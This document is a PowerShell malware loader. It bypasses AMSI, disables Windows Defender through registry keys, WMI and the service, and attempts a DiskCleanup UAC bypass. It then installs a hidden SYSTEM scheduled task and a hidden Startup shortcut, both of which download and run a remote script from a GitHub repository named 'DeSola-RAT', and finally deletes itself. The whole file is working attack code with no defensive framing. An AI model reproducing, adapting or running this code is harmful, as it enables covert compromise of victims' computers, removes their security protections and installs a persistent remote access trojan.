# requires -Version 5.1
# requires -RunAsAdministrator

# --- Obfuscation & Evasion ---
$ErrorActionPreference = 'SilentlyContinue'

# Bypass AMSI (Anti-Malware Scan Interface) in memory
try {
    $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null, $true)
} catch {}

# Obfuscated function names
function Invoke-StealthDownload { param($u) Invoke-Expression (New-Object System.Net.WebClient).DownloadString($u) }
function Set-DefenderToSleep {
    # Disable Real-time Monitoring via WMI (less noisy than Set-MpPreference)
    try {
        $defender = Get-WmiObject -Namespace "root\SecurityCenter2" -Class "AntivirusProduct" -ErrorAction SilentlyContinue
        if ($defender) {
            $defender.disable() | Out-Null
        }
    } catch {}

    # Tamper Protection & Registry Kill
    $regPaths = @(
        "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender",
        "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
    )
    $settings = @(
        @{Name="DisableAntiSpyware"; Value=1},
        @{Name="DisableRoutinelyTakingAction"; Value=1},
        @{Name="DisableRealtimeMonitoring"; Value=1},
        @{Name="DisableBehaviorMonitoring"; Value=1},
        @{Name="DisableBlockAtFirstSeen"; Value=1},
        @{Name="DisableIOAVProtection"; Value=1}
    )
    foreach ($path in $regPaths) {
        if (!(Test-Path $path)) { New-Item -Path $path -Force | Out-Null }
        foreach ($s in $settings) { Set-ItemProperty -Path $path -Name $s.Name -Value $s.Value -Type DWORD -Force }
    }

    # Stop and disable the service
    Stop-Service -Name "WinDefend" -Force -ErrorAction SilentlyContinue
    Set-Service -Name "WinDefend" -StartupType Disabled -ErrorAction SilentlyContinue
}
function Invoke-Persistence {
    # Generate random names for everything
    $rand = -join ((65..90) + (97..122) | Get-Random -Count 7 | ForEach-Object {[char]$_})
    $taskName = "Windows-$rand-Update"
    $scriptPath = "$env:TEMP\$rand.ps1"

    # Create a hidden, obfuscated payload on disk
    $payload = @"
# Obfuscated persistence script
`$ErrorActionPreference='SilentlyContinue'; `$s='https://raw.githubusercontent.com/r00tm4st3r/DeSola-RAT/refs/heads/main/files/l.ps1'; try { IEX (New-Object Net.WebClient).DownloadString(`$s) } catch {}
"@
    Set-Content -Path $scriptPath -Value $payload -Force
    attrib +h +s $scriptPath

    # Create a hidden scheduled task running as SYSTEM for maximum privilege
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
    $trigger = New-ScheduledTaskTrigger -AtLogon
    $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -User "SYSTEM" -Force | Out-Null

    # Add to Startup folder as a backup (hidden .lnk)
    $startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    $wsh = New-Object -ComObject WScript.Shell
    $shortcut = $wsh.CreateShortcut("$startup\$rand.lnk")
    $shortcut.TargetPath = "powershell.exe"
    $shortcut.Arguments = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/r00tm4st3r/DeSola-RAT/refs/heads/main/files/l.ps1')`""
    $shortcut.WindowStyle = 7
    $shortcut.IconLocation = "C:\Windows\System32\imageres.dll,3"
    $shortcut.Save()
    attrib +h +s "$startup\$rand.lnk"
}
function Invoke-UACBypass {
    # Check if already elevated
    if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        # Use a less common but effective UAC bypass (DiskCleanup)
        $regPath = "HKCU:\Software\Classes\CLSID\{B29F221D-1E84-4B4B-B6A6-7CA6F26E3E26}\InprocServer32"
        if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
        Set-ItemProperty -Path $regPath -Name "(Default)" -Value "C:\windows\system32\windows.storage.dll" -Force
        Set-ItemProperty -Path $regPath -Name "ThreadingModel" -Value "Apartment" -Force

        # Trigger the bypass
        Start-Process "cleanmgr.exe" -ArgumentList "/autoclean /sagerun:1" -WindowStyle Hidden

        # Give it a moment to launch elevated, then re-run this script
        Start-Sleep -Seconds 3
        Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`""
        exit
    }
}

# --- Main Execution Logic ---
Invoke-UACBypass
Set-DefenderToSleep
Invoke-Persistence

# Clean up the initial script if run from a file
if ($MyInvocation.MyCommand.Path) {
    Remove-Item -Path $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
}